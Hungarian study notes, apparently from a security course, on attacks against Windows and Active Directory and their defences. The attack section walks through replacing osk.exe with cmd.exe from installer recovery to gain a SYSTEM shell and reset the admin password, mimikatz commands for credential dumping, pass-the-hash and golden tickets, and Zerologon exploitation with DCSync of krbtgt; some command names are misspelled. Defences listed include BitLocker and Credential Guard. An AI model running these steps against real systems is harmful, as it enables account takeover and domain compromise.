### Támadások
#### Elfelejtett jelszó
+ Jelszavas védelem kikapcsolása
  + windows installerből shift+f10  -> admin console cmd
  + átlépünk a c:-be
  + ren osk.exe osk.exe.bak -- rename  
  + cmd-t bemásolni osk.exe helyére
  + vissza login screen
  + ott az on screen keyboard indításával a cmd fut le
  + whoami -- **nt authority\system**
  + mmc -- microsoft management console
    + innen az admin jelszó egyszerűen megváltoztatható
+ pas the hash támadás
  + kliensen admin jogosultság
  + mimikatz alkalmazással
    + privilidge::debug
    + sekurmsa::logonPasswords -- dumb msa pwd-s
    + kell keresni egy magasabb szintű user-t pl domain admin és akkor megszerzed igy a hash-t
    + sekurmsa::pth /user: username  /domain: domain /ntlm: hash
    + krbtgt
      + kerberos key distribution user account
      + golden ticket
        + mindenki nevében tudd ticketet előállítani
+ Zero logon
  + domain kontroller jelszó reset
  + mimiikatz
  + lsadumb::zerologon /target:DC /account:DC$ /null /ntlm
    + check hogy exploitable
  + lsadumb::zerologon /target:DC /account:DC$ /null /ntlm  /exploit
  + lsadump::dcsync /domain: domain /dc:DC /user:krbtgt (ez fontos hogy ő) /authuser:DC$


### Védések
+ Bitlocker
  + Require additional auth on startup
  + kriptálva van a HDD

+ turn on virtualization based security
  + credential Guard
    + UEFI lock: csak uefi-bő lehessen kikapcsolni
  + a hash enkriptálva lesz

+ System update

### Info
+ EFS
  + file szintű titkosítás
  + transzparensen titkosítva
  + advanced attributes-ben lehet



+ Domain groupos támadások
  + pas the hash támadás
    + elég ezt a hash tudni belépéshez
    + ki lehet szedni a hash-t az msa local security authority process-ből
